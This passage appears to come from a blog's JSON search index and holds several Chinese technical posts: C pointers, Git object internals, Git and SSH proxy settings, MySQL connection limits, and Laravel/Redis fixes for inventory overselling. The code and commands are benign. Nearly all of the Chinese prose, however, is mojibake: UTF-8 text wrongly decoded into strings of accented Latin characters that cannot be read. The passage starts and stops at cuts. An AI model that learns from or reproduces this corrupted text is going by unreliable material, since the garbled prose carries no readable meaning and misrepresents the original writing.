æŒ‡é’ˆçš„åç§»&#125;int main(int argc, char const *argv[])&#123; int i = 1; modify_num(i); printf(\"i = %d \\n\", i); // 5 int *p = NULL; modify_pointer(p); printf(\"p[0] = %d \\n\", p[0]); // 9 printf(\"p[1] = %d \\n\", p[1]); // 2 return 0;&#125;","categories":[{"name":"C","slug":"C","permalink":"https://www.0x2beace.com/categories/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://www.0x2beace.com/tags/C/"}]},{"title":".git æ¢ç§˜ â€” è®¤è¯† Git å¯¹è±¡","slug":"git-exploring-â€”-getting-to-know-git-objects","date":"2022-05-03T02:42:20.000Z","updated":"2022-05-24T02:20:27.782Z","comments":true,"path":"git-exploring-â€”-getting-to-know-git-objects/","link":"","permalink":"https://www.0x2beace.com/git-exploring-%E2%80%94-getting-to-know-git-objects/","excerpt":"ä»æ ¹æœ¬ä¸Šæ¥è®²gitæ˜¯ä¸€ä¸ªå†…å®¹å¯»å€ï¼ˆcontent-addressableï¼‰æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨æ­¤ä¹‹ä¸Šæä¾›äº†ä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢ã€‚","text":"ä»æ ¹æœ¬ä¸Šæ¥è®²gitæ˜¯ä¸€ä¸ªå†…å®¹å¯»å€ï¼ˆcontent-addressableï¼‰æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨æ­¤ä¹‹ä¸Šæä¾›äº†ä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢ã€‚ æ‰€æœ‰çš„ git ä»“åº“çš„æ ¹ç›®å½•ä¸‹é¢éƒ½æœ‰ä¸ª .git æ–‡ä»¶, å®ƒé»˜è®¤æ˜¯éšè—çš„ï¼Œ.git æ–‡ä»¶å¤¹ç»“æ„å¦‚ä¸‹ï¼š å„æ–‡ä»¶é‡Œé¢å­˜å‚¨çš„å†…å®¹ï¼š æ–‡ä»¶å¤¹ ç±»å‹ ä½œç”¨ hooks æ–‡ä»¶å¤¹ åŒ…å«å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯çš„é’©å­è„šæœ¬; æˆ‘ä»¬æœ€å¸¸ç”¨çš„å°±æ˜¯pre-commité’©å­äº† info æ–‡ä»¶å¤¹ åŒ…å«ä¸€ä¸ªå…¨å±€æ€§æ’é™¤æ–‡ä»¶ logs æ–‡ä»¶å¤¹ ä¿å­˜æ—¥å¿—ä¿¡æ¯; git reflog å±•ç¤ºçš„å†…å®¹ objects æ–‡ä»¶å¤¹ ç›®å½•å­˜å‚¨æ‰€æœ‰æ•°æ®å†…å®¹, è¿™å°±æ˜¯å®é™…æ„ä¹‰ä¸Šçš„ gitæ•°æ®åº“, å­˜æ•°æ®çš„åœ°æ–¹; å¹¶ä¸”å­˜äº†æ‰€æœ‰çš„å†å²è®°å½• refs æ–‡ä»¶å¤¹ ç›®å½•å­˜å‚¨æŒ‡å‘æ•°æ®ï¼ˆåˆ†æ”¯ã€è¿œç¨‹ä»“åº“å’Œæ ‡ç­¾ç­‰ï¼‰çš„æäº¤å¯¹è±¡çš„æŒ‡é’ˆ config æ–‡ä»¶ åŒ…å«å½“å‰é¡¹ç›®ç‰¹æœ‰çš„é…ç½®é€‰é¡¹ description æ–‡ä»¶ ç”¨æ¥æ˜¾ç¤ºå¯¹ä»“åº“çš„æè¿°ä¿¡æ¯,æ–‡ä»¶ä»…ä¾› GitWeb ç¨‹åºä½¿ç”¨ï¼Œæˆ‘ä»¬æ— éœ€å…³å¿ƒ HEAD æ–‡ä»¶ å®ƒæ–‡ä»¶é€šå¸¸æ˜¯ä¸€ä¸ªç¬¦å·å¼•ç”¨ï¼ˆsymbolic referenceï¼‰ï¼ŒæŒ‡å‘ç›®å‰æ‰€åœ¨çš„åˆ†æ”¯ã€‚æŸäº›ç½•è§çš„æƒ…å†µä¸‹ï¼ŒHEAD æ–‡ä»¶å¯èƒ½ä¼šåŒ…å«ä¸€ä¸ª git å¯¹è±¡çš„ SHA-1 å€¼ index æ–‡ä»¶å¤¹ æ–‡ä»¶ä¿å­˜æš‚å­˜åŒºä¿¡æ¯ FETCH_HEAD æ–‡ä»¶ git fetch; è¿™å°†æ›´æ–°git remote ä¸­æ‰€æœ‰çš„è¿œç¨‹repo æ‰€åŒ…å«åˆ†æ”¯çš„æœ€æ–°commit-id, å°†å…¶è®°å½•åˆ°.git/FETCH_HEADæ–‡ä»¶ä¸­ packed-refs æ–‡ä»¶ å¯¹refsæ‰“åŒ…å(git gc)çš„å­˜å‚¨æ–‡ä»¶, ä¸åº•å±‚å‘½ä»¤git pack-refs æ‰€æœ‰çš„æ•°æ®å¯¹è±¡å‡å­˜å‚¨äºé¡¹ç›®ä¸‹é¢çš„ .git/objects ç›®å½•ä¸­ï¼Œé‚£ä¹ˆ.git/objects æ–‡ä»¶å¤¹é‡Œé¢ç©¶ç«Ÿå­˜äº†äº›ä»€ä¹ˆï¼Ÿ Git å¯¹è±¡ç‰ˆæœ¬åº“ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸è®ºæ˜¯å›¾ç‰‡ã€æºæ–‡ä»¶è¿˜æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéƒ½è¢«æ˜ å°„ä¸ºä¸€ä¸ª Blob å¯¹è±¡ã€‚é™¤äº† Blob å¯¹è±¡ï¼Œåœ¨ Git çš„æ–‡ä»¶ç³»ç»Ÿä¸­è¿˜å­˜å‚¨ç€å¦å¤–ä¸‰ç§æ•°æ®å¯¹è±¡ï¼š æ ‘å¯¹è±¡(tree) æäº¤å¯¹è±¡(commit) æ ‡ç­¾å¯¹è±¡(tag) Blob å¯¹è±¡Blob æ˜¯è‹±æ–‡ Binary large object çš„ç¼©å†™ï¼Œä¸€ä¸ª Blob å¯¹è±¡å°±æ˜¯ä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ã€‚ 123456$ echo -n \"print 'hello git'\" &gt; index.md$ git add index.md$ find .git/objects -type f.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.pack.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.idx.git/objects/42/a3276feefd4f52d48aa831db535d6e81b6e0fb æŸ¥çœ‹æ•°æ®å¯¹è±¡çš„ç±»å‹ï¼š 12git cat-file -t 42a3276feefd4f52d48aa831db535d6e81b6e0fbblob æŸ¥çœ‹æ•°æ®å¯¹è±¡çš„å†…å®¹ï¼š 12git cat-file -p 42a3276feefd4f52d48aa831db535d6e81b6e0fbprint 'hello git'% ä¸ºäº†æŠŠæ–‡ä»¶æ˜ å°„ä¸º Blob å¯¹è±¡ï¼ŒGit åšäº†ä¸‹é¢è¿™äº›å·¥ä½œï¼š è¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ·»åŠ ä¸€æ®µç‰¹æ®Šæ ‡è®°åˆ°å¤´éƒ¨ï¼Œå¾—åˆ°æ–°çš„å†…å®¹ï¼Œè®°ä¸º contentï¼› å¯¹è¯¥ content æ‰§è¡Œ SHA-1 åŠ å¯†ï¼Œå¾—åˆ°ä¸€ä¸ªé•¿åº¦ä¸º40å­—ç¬¦çš„ hash å€¼ï¼Œä¾‹å¦‚ 64fe72272a79bff953d7de2062d3f52b4679c659ï¼› å–è¯¥ hash å€¼çš„å‰ä¸¤ä½ä½œä¸ºå­ç›®å½•ï¼Œå‰©ä¸‹çš„38ä½ä½œä¸ºæ–‡ä»¶åï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œå­ç›®å½•åæ˜¯â€™64/â€˜ï¼Œæ–‡ä»¶åæ˜¯â€™fe72272a79bff953d7de2062d3f52b4679c659â€™ï¼› å¯¹ content æ‰§è¡Œ zip å‹ç¼©ï¼Œå¾—åˆ°æ–°çš„äºŒè¿›åˆ¶å†…å®¹ï¼Œå­˜å…¥æ–‡ä»¶ä¸­ã€‚ Tree å¯¹è±¡Git ä½¿ç”¨ä¸€ç§ä¸ UNIX æ–‡ä»¶ç³»ç»Ÿç›¸ä¼¼çš„æ–¹å¼æ¥ç®¡ç†å†…å®¹ï¼ŒBlob ç›¸å½“äºç£ç›˜æ–‡ä»¶ï¼ŒTree åˆ™ç›¸å½“äºæ–‡ä»¶å¤¹ã€‚Tree ä¸­æ—¢å¯ä»¥åŒ…å« Blobï¼Œä¹Ÿå¯ä»¥åŒ…å«å…¶ä»– Treeã€‚ å‘ç‰ˆæœ¬åº“ä¸­æäº¤å½“å‰çš„ä¿®æ”¹ï¼š 1git commit -m \"first commit\" ä¼šå‘ç° .git/objects ç›®å½•ä¸‹é¢å¤šå‡ºäº†ä¸¤ä¸ªå¯¹è±¡ï¼š 123456find .git/objects -type f.git/objects/93/292574c965d7ecd25f933fdadb646dce75cc24.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.pack.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.idx.git/objects/42/a3276feefd4f52d48aa831db535d6e81b6e0fb.git/objects/30/31cddff73840bd5e7822c9b7f3b538e7e160bb è¿™ä¸¤ä¸ªå¯¹è±¡çš„ç±»å‹åˆ†åˆ«æ˜¯ commit å’Œ treeï¼š 12345git cat-file -t 93292574c965d7ecd25f933fdadb646dce75cc24treegit cat-file -t 3031cddff73840bd5e7822c9b7f3b538e7e160bbcommit æŸ¥çœ‹ 93292574c965d7ecd25f933fdadb646dce75cc24 è¿™ä¸ªå¯¹è±¡çš„å†…å®¹ï¼š 1234git cat-file -p 93292574c965d7ecd25f933fdadb646dce75cc24...100644 blob 42a3276feefd4f52d48aa831db535d6e81b6e0fb index.md... å¯è§è¿™é¢—æ ‘å°±ç›¸å½“äºé¡¹ç›®çš„æ ¹ç›®å½•ã€‚ Commit å¯¹è±¡ä¸€ä¸ª Commit å¯¹è±¡ä»£è¡¨äº†ä¸€æ¬¡æäº¤å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†ä¸‹é¢è¿™äº›ä¿¡æ¯ï¼š ä½•äººä½•æ—¶ä½œäº†è¯¥æ¬¡æäº¤ è¯¥æ¬¡æäº¤çš„ç®€ç•¥è¯´æ˜ ä¸€æ£µæ ‘ çˆ¶çº§ Commit å¯¹è±¡ å…¶ä¸­ï¼Œè¿™é¢—æ ‘ä¹Ÿè¢«ç§°ä½œé¡¹ç›®å¿«ç…§ï¼ˆsnapshortï¼‰ï¼Œé€šè¿‡é¡¹ç›®å¿«ç…§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠé¡¹ç›®è¿˜åŸæˆé¡¹ç›®åœ¨è¯¥æ¬¡æäº¤æ—¶çš„æ ·å­ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œcommit å¯¹è±¡æ€»æœ‰ä¸€ä¸ªçˆ¶çº§ commit å¯¹è±¡ï¼Œä¸€ä¸ªåˆä¸€ä¸ª commit å¯¹è±¡é€šè¿‡è¿™ç§æ–¹å¼é“¾æ¥èµ·æ¥ï¼Œå°±æ„æˆäº†ä¸€æ¡æäº¤å†å²ã€‚ç¬¬ä¸€æ¬¡æäº¤çš„ commit å¯¹è±¡æ²¡æœ‰çˆ¶çº§ commit å¯¹è±¡ï¼Œåˆ†æ”¯åˆå¹¶æ‰€äº§ç”Ÿçš„æ–°çš„ commit å¯¹è±¡å¯ä»¥æœ‰ä¸¤ä¸ªæˆ–è€…å¤šä¸ªçˆ¶çº§ commit å¯¹è±¡ã€‚ ä¾‹å¦‚ï¼Œ3031cddff73840bd5e7822c9b7f3b538e7e160bb è¿™ä¸ª Commit å¯¹è±¡çš„å†…å®¹ä¸ºï¼š 1234567git cat-file -p 3031cddff73840bd5e7822c9b7f3b538e7e160bbtree 93292574c965d7ecd25f933fdadb646dce75cc24parent 3c46f2d56ee15502cabeda97d6f44a95289c8804author Boo &lt;aikangtongxue@gmail.com&gt; 1651542437 +0800committer Boo &lt;aikangtongxue@gmail.com&gt; 1651542437 +0800first commit æ­¤æ—¶ç‰ˆæœ¬åº“ä¸­ï¼ŒCommitã€Treeã€Blob ä¸‰è€…ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Tag å¯¹è±¡Tag æŒ‡å‘ä¸€æ¬¡ç‰¹å¾æäº¤ã€‚ åœ¨ Git ä¸­æœ‰ä¸¤ç§ tagï¼Œç¬¬ä¸€ç§ tag å¹¶ä¸åœ¨ .git/objects ç›®å½•ä¸‹é¢åˆ›å»ºæ–°çš„å¯¹è±¡ï¼Œåªæ˜¯åœ¨ .git/refs/tags ç›®å½•ä¸­æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯æ‰€æŒ‡å‘çš„ commit å¯¹è±¡çš„ hash å€¼ï¼š 12345$ git tag v0.1$ find .git/refs/tags -type f.git/refs/tags/v0.1$ cat .git/refs/tags/v0.13031cddff73840bd5e7822c9b7f3b538e7e160bb å¦ä¸€ç§ tag åˆ™ä¼šåœ¨ .git/objects ç›®å½•ä¸‹é¢åˆ›å»ºå¯¹è±¡ï¼Œè¿™ç§ tag è¢«ç§°ä½œæ³¨è§£æ ‡ç­¾ï¼ˆannotated tagï¼‰ï¼š 12345678$ git tag -a v0.2 -m \"Version 0.2\"$ find .git/objects -type f.git/objects/93/292574c965d7ecd25f933fdadb646dce75cc24.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.pack.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.idx.git/objects/42/a3276feefd4f52d48aa831db535d6e81b6e0fb.git/objects/30/31cddff73840bd5e7822c9b7f3b538e7e160bb.git/objects/cd/542f02e1b07b78a11534c68b1d334365effc65 æŸ¥çœ‹æ•°æ®å¯¹è±¡ç±»å‹åŠå†…å®¹ï¼š 123456789$ git cat-file -t cd542f02e1b07b78a11534c68b1d334365effc65tag$ git cat-file -p cd542f02e1b07b78a11534c68b1d334365effc65object 3031cddff73840bd5e7822c9b7f3b538e7e160bbtype committag v0.2tagger Boo &lt;aikangtongxue@gmail.com&gt; 1651543206 +0800Version 0.2 æ€»ç»“åœ¨ Git çš„åº•å±‚ï¼Œæœ‰å››ç§æ•°æ®ç»“æ„ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š Blob Tree Commit Tag Git æŠŠç‰ˆæœ¬åº“ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½è½¬æ¢ä¸ºä¸€ä¸ª blob å¯¹è±¡è¿›è¡Œå­˜å‚¨ï¼Œè€Œç”¨ tree å¯¹è±¡æ¥è¡¨è¾¾æ–‡ä»¶çš„å±‚æ¬¡ç»“æ„ã€‚ Commit å¯¹è±¡ä»£è¡¨äº†ä¸€æ¬¡æäº¤æ“ä½œï¼Œå®ƒåŒ…å«äº†å½“å‰çš„é¡¹ç›®å¿«ç…§ä»¥åŠæäº¤äººå’Œæäº¤æ—¥æœŸç­‰è¯¸å¤šä¿¡æ¯ã€‚æ‰€æœ‰çš„ commit å¯¹è±¡ä¸²æ¥èµ·æ¥ï¼Œç»„æˆä¸€ä¸ªæœ‰å‘æ— ç¯å›¾ã€‚ä»ç‰ˆæœ¬æ§åˆ¶çš„è§’åº¦çœ‹ï¼Œè¿™äº› commit å¯¹è±¡æ„æˆäº†ä¸€ä¸ªå®Œæ•´çš„ç‰ˆæœ¬æäº¤è®°å½•ï¼›ä»é¡¹ç›®å¼€å‘çš„è§’åº¦çœ‹ï¼Œå®ƒä»¬æè¿°äº†é¡¹ç›®æ˜¯å¦‚ä½•ä»æ— åˆ°æœ‰ä¸€ç‚¹ä¸€æ»´åœ°æ„å»ºèµ·æ¥çš„ã€‚ Tag å¯¹è±¡æŒ‡å‘ä¸€ä¸ª commit å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ tag å¯¹è±¡å¿«é€Ÿè®¿é—®åˆ°é¡¹ç›®çš„æŸä¸€æ¬¡ç‰¹å¾æäº¤ã€‚ å‚è€ƒé“¾æ¥ Git ä¹‹æœ¯ä¸é“ â€“ å¯¹è±¡ Git å†…éƒ¨åŸç† - Git å¯¹è±¡ gitä»“åº“æ¸…ç†â€“â€ä¿å§†çº§â€æ•™ç¨‹","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"git è®¾ç½®å’Œå–æ¶ˆä»£ç†","slug":"git-set-and-cancel-proxy","date":"2022-05-02T06:46:04.000Z","updated":"2022-05-24T02:20:27.782Z","comments":true,"path":"git-set-and-cancel-proxy/","link":"","permalink":"https://www.0x2beace.com/git-set-and-cancel-proxy/","excerpt":"åœ¨ä½¿ç”¨ Git æ—¶ï¼Œç»å¸¸ä¼šéœ€è¦å…‹éš†ä»“åº“ï¼Œæœ‰æ—¶å€™æ˜¯å›½å†…çš„ä»“åº“ï¼Œæœ‰æ—¶å€™æ˜¯å›½å¤–çš„ä»“åº“ï¼Œå¦‚æœç›´æ¥å¼ºåˆ¶è®©ç»ˆç«¯èµ°ä»£ç†ï¼Œé‚£ä¹ˆå½“å…‹éš†å›½å†…ä»“åº“æ—¶ï¼Œé€Ÿåº¦å¯èƒ½ç‰¹åˆ«æ…¢ã€‚ è¿™ä¸ªæ—¶å€™å…¶å®å¯ä»¥åªé’ˆå¯¹éƒ¨åˆ†åŸŸåè¿›è¡Œä»£ç†è®¾ç½®ï¼Œè€Œå…¶ä»–åŸŸååˆ™ä¸ç”¨èµ°ä»£ç†ã€‚","text":"åœ¨ä½¿ç”¨ Git æ—¶ï¼Œç»å¸¸ä¼šéœ€è¦å…‹éš†ä»“åº“ï¼Œæœ‰æ—¶å€™æ˜¯å›½å†…çš„ä»“åº“ï¼Œæœ‰æ—¶å€™æ˜¯å›½å¤–çš„ä»“åº“ï¼Œå¦‚æœç›´æ¥å¼ºåˆ¶è®©ç»ˆç«¯èµ°ä»£ç†ï¼Œé‚£ä¹ˆå½“å…‹éš†å›½å†…ä»“åº“æ—¶ï¼Œé€Ÿåº¦å¯èƒ½ç‰¹åˆ«æ…¢ã€‚ è¿™ä¸ªæ—¶å€™å…¶å®å¯ä»¥åªé’ˆå¯¹éƒ¨åˆ†åŸŸåè¿›è¡Œä»£ç†è®¾ç½®ï¼Œè€Œå…¶ä»–åŸŸååˆ™ä¸ç”¨èµ°ä»£ç†ã€‚ https ä»£ç†é’ˆå¯¹æ‰€æœ‰ https è¯·æ±‚ç”Ÿæ•ˆï¼š 1git config --global https.proxy https://127.0.0.1:1080 å–æ¶ˆè®¾ç½®ä»£ç†ï¼š 1git config --global --unset https.proxy åªé’ˆå¯¹ github.com ç”Ÿæ•ˆ 1git config --global http.https://github.com.proxy socks5://127.0.0.1:1080 å–æ¶ˆè®¾ç½®ä»£ç† 1git config --global --unset http.https://github.com.proxy ssh ä»£ç†éœ€è¦ä¿®æ”¹ ~/.ssh/configæ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰ï¼Œæ–°å»ºä¸€ä¸ªã€‚ macOS ä¸‹ï¼ŒåŒæ ·ä»…ä¸º github.com è®¾ç½®ä»£ç†ï¼š 123Host github.com User git ProxyCommand nc -v -x 127.0.0.1:1086 %h %p å¦‚æœæ˜¯åœ¨ Windows ä¸‹ï¼Œè®¾ç½®ä»£ç†å‘½ä»¤ä¼šæœ‰æ‰€ä¸åŒï¼š 123Host github.com User git ProxyCommand connect -S 127.0.0.1:1086 %h %p å‚è€ƒé“¾æ¥ git è®¾ç½®å’Œå–æ¶ˆä»£ç†","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Mysql Too many connections å¼‚å¸¸è®°å½•","slug":"mysql-too-many-connections-exception-record","date":"2022-04-17T03:16:50.000Z","updated":"2022-05-24T02:20:27.784Z","comments":true,"path":"mysql-too-many-connections-exception-record/","link":"","permalink":"https://www.0x2beace.com/mysql-too-many-connections-exception-record/","excerpt":"å‰æ®µæ—¶é—´ï¼Œçº¿ä¸Šä¸šåŠ¡å¶å°”ä¼šå‡ºç° SQLSTATE[HY000] [1040] Too many connections çš„å¼‚å¸¸ã€‚ é€šå¸¸æ˜¯ä»¥ä¸‹ä¸¤ç§åŸå› ä¹‹ä¸€é€ æˆçš„ï¼š max_connections é…ç½®è¿‡å° è®¿é—®é‡è¿‡é«˜","text":"å‰æ®µæ—¶é—´ï¼Œçº¿ä¸Šä¸šåŠ¡å¶å°”ä¼šå‡ºç° SQLSTATE[HY000] [1040] Too many connections çš„å¼‚å¸¸ã€‚ é€šå¸¸æ˜¯ä»¥ä¸‹ä¸¤ç§åŸå› ä¹‹ä¸€é€ æˆçš„ï¼š max_connections é…ç½®è¿‡å° è®¿é—®é‡è¿‡é«˜ çŸ¥è¯†ç‚¹max_connectionsMysql çš„ max_connections æ˜¯é™åˆ¶å…è®¸å®¢æˆ·ç«¯åŒæ—¶è¿æ¥çš„æœ€å¤§è¿æ¥æ•°ã€‚ 1234567mysql&gt; show variables like &#39;%max_connections%&#39;;+-----------------+-------+| Variable_name | Value |+-----------------+-------+| max_connections | 500 |+-----------------+-------+1 row in set (0.01 sec) Mysql æ— è®ºå¦‚ä½•éƒ½ä¼šä¿ç•™ä¸€ä¸ªç”¨äºç®¡ç†å‘˜ï¼ˆSUPERï¼‰ç™»é™†çš„è¿æ¥ï¼Œç”¨äºç®¡ç†å‘˜è¿æ¥æ•°æ®åº“è¿›è¡Œç»´æŠ¤æ“ä½œï¼Œæ‰€ä»¥å³ä¾¿å½“å‰è¿æ¥æ•°å·²ç»è¾¾åˆ°äº† max_connectionsï¼Œç®¡ç†å‘˜ä»å¯ä»¥è¿æ¥ï¼Œå› æ­¤ Mysql çš„å®é™…æœ€å¤§å¯è¿æ¥æ•°ä¸º max_connections+1ã€‚ å¢åŠ  max_connections å‚æ•°çš„å€¼ï¼Œä¸ä¼šå ç”¨å¤ªå¤šç³»ç»Ÿèµ„æºã€‚ç³»ç»Ÿèµ„æºï¼ˆCPUã€å†…å­˜ï¼‰çš„å ç”¨ä¸»è¦å–å†³äºæŸ¥è¯¢çš„å¯†åº¦ã€æ•ˆç‡ç­‰ã€‚ Max_used_connectionsMysql çš„ Max_used_connections æ˜¯è‡ªæœåŠ¡å™¨å¯åŠ¨ä»¥æ¥åŒæ—¶ä½¿ç”¨çš„æœ€å¤§è¿æ¥æ•°ã€‚ 1234567mysql&gt; show global status like &#39;Max_used_connections&#39;;+----------------------+-------+| Variable_name | Value |+----------------------+-------+| Max_used_connections | 101 |+----------------------+-------+1 row in set (0.00 sec) é€šè¿‡æŸ¥çœ‹è¿™ä¸ªå€¼ï¼Œæˆ‘ä»¬å°±èƒ½çŸ¥é“æ˜¯å¦éœ€è¦è°ƒæ•´ max_connectionsã€‚ å¯¹äº Mysql æœ€å¤§è¿æ¥æ•°å€¼çš„è®¾ç½®èŒƒå›´æ¯”è¾ƒç†æƒ³çš„æ˜¯ï¼šæœåŠ¡å™¨å“åº”çš„æœ€å¤§è¿æ¥æ•°å€¼å æœåŠ¡å™¨ä¸Šé™è¿æ¥æ•°å€¼çš„æ¯”ä¾‹å€¼åœ¨10%ä»¥ä¸Šï¼Œå¦‚æœåœ¨10%ä»¥ä¸‹ï¼Œè¯´æ˜æœ€å¤§è¿æ¥ä¸Šé™å€¼è®¾ç½®è¿‡é«˜ï¼Œåä¹‹å¦‚æœæœåŠ¡å™¨å“åº”çš„æœ€å¤§è¿æ¥æ•°å€¼ä¸ä¸Šé™è¿æ¥æ•°å€¼å¾ˆæ¥è¿‘ï¼Œåˆ™è¯´æ˜æœ€å¤§è¿æ¥ä¸Šé™å€¼è®¾ç½®è¿‡ä½ã€‚ è§£å†³æ–¹æ¡ˆå¦‚æœä¸šåŠ¡é‡å¹¶ä¸å¤§ï¼Œæ²¡æœ‰é«˜å¹¶å‘ç­‰åœºæ™¯ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½æ˜¯ç¬¬ä¸€ç§åŸå› ï¼Œè¿™ä¹Ÿæ˜¯æœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆï¼Œç›´æ¥ä¿®æ”¹æœ€å¤§è¿æ¥æ•°é‡ã€‚å¦‚æœæ˜¯å› ä¸ºè®¿é—®é‡è¿‡é«˜ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦è€ƒè™‘å¢åŠ ä»æœåŠ¡å™¨æˆ–åˆ†æ•£è¯»å‹åŠ›äº†ï¼ˆä¸åœ¨æœ¬æ–‡è°ˆè®ºèŒƒå›´ï¼‰ã€‚ é€šå¸¸ä¿®æ”¹æœ€å¤§è¿æ¥æ•°é‡æœ‰ä¸¤ç§æ–¹å¼ï¼š ç›´æ¥é€šè¿‡å‘½ä»¤è¡Œè¿›è¡Œä¿®æ”¹ï¼š1mysql&gt; set global max_connections &#x3D; 1000; ä½¿ç”¨è¿™ç§æ–¹å¼éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ›´æ–°ä¹‹åçš„æœ€å¤§è¿æ¥æ•°é‡ï¼Œåªåœ¨ Mysql å½“å‰æœåŠ¡è¿›ç¨‹æœ‰æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€æ—¦é‡å¯ Mysqlï¼Œåˆä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚å› ä¸º Mysql å¯åŠ¨åçš„åˆå§‹åŒ–å·¥ä½œæ˜¯ä»å…¶é…ç½®æ–‡ä»¶ä¸­è¯»å–æ•°æ®çš„ï¼Œè€Œè¿™ç§æ–¹å¼æ²¡æœ‰å¯¹å…¶é…ç½®æ–‡ä»¶åšæ›´æ”¹ã€‚ ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š æ‰¾åˆ° my.ini æˆ– my.cnf é…ç½®æ–‡ä»¶ 1max_connections&#x3D;1000 é‡å¯ Mysql å³å¯ã€‚ å‚è€ƒé“¾æ¥ Mysql Too many connections mysql æœ€å¤§è¿æ¥æ•°æ¦‚å¿µã€ä½œç”¨åŠä¿®æ”¹","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"åº“å­˜è¶…å‡ºå¸¸è§è§£å†³æ–¹æ¡ˆæ•´ç†","slug":"inventory-beyond-common-solution-collation","date":"2022-04-16T09:46:18.000Z","updated":"2022-05-24T02:20:27.783Z","comments":true,"path":"inventory-beyond-common-solution-collation/","link":"","permalink":"https://www.0x2beace.com/inventory-beyond-common-solution-collation/","excerpt":"åŸæ–‡é“¾æ¥ï¼šä½¿ç”¨laravelè§£å†³åº“å­˜è¶…å‡ºçš„å‡ ä¸ªæ–¹æ¡ˆ åº“å­˜è¶…å‡ºæ˜¯ä¸€ä¸ªå¸¸è§çš„å¹‚ç­‰é—®é¢˜ï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹è§£å†³è¶…å–é—®é¢˜å¸¸è§çš„ä¸€äº›æ–¹æ¡ˆ Redis å­˜å‚¨åº“å­˜ Redis åŸå­é” Mysql æ‚²è§‚é” Mysql ä¹è§‚é”","text":"åŸæ–‡é“¾æ¥ï¼šä½¿ç”¨laravelè§£å†³åº“å­˜è¶…å‡ºçš„å‡ ä¸ªæ–¹æ¡ˆ åº“å­˜è¶…å‡ºæ˜¯ä¸€ä¸ªå¸¸è§çš„å¹‚ç­‰é—®é¢˜ï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹è§£å†³è¶…å–é—®é¢˜å¸¸è§çš„ä¸€äº›æ–¹æ¡ˆ Redis å­˜å‚¨åº“å­˜ Redis åŸå­é” Mysql æ‚²è§‚é” Mysql ä¹è§‚é” å‡†å¤‡å‡†å¤‡ä¸€å¼ å®éªŒè¡¨ï¼š 1234567+-------+------------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+------------------+------+-----+---------+----------------+| id | int(11) unsigned | NO | PRI | NULL | auto_increment || name | varchar(10) | YES | | NULL | || num | int(11) | YES | | NULL | |+-------+------------------+------+-----+---------+----------------+ ä½¿ç”¨ go æ¨¡æ‹Ÿå¹¶å‘ï¼š 123456789101112131415161718192021package mainimport ( \"fmt\" \"github.com/PeterYangs/tools/http\" \"sync\")func main() &#123; client := http.Client() wait := sync.WaitGroup&#123;&#125; for i := 0; i &lt; 50; i++ &#123; wait.Add(1) go func(w *sync.WaitGroup) &#123; defer w.Done() res, _ := client.Request().GetToString(\"http://www.api/test1?id=1\") fmt.Println(res) &#125;(&amp;wait) &#125; wait.Wait()&#125; é”™è¯¯ç¤ºèŒƒ1234567891011121314function test()&#123; $id = request()-&gt;input('id'); $product = Product::where('id', $id)-&gt;firstOrFail(); if ($product-&gt;num &lt;= 0) &#123; return \"å–å…‰å•¦ï¼ï¼\"; &#125; $product-&gt;decrement('num'); return \"success\";&#125; æŸ¥çœ‹åº“å­˜ï¼š åº“å­˜è¶…å‡ºã€‚ Redis å­˜å‚¨åº“å­˜123456789101112131415161718public function test()&#123; $id = request()-&gt;input('id'); $redis = new \\Redis(); $num = $redis-&gt;rawCommand('get', 'product_' . $id); if ($num &lt;= 0) &#123; return \"å–å®Œå•¦ï¼\"; &#125; //å‡åº“å­˜ $result = $redis-&gt;rawCommand('decrby', 'product_' . $id, 1); //å‡å¤šäº†å›æ»š if ($result &lt; 0) &#123; 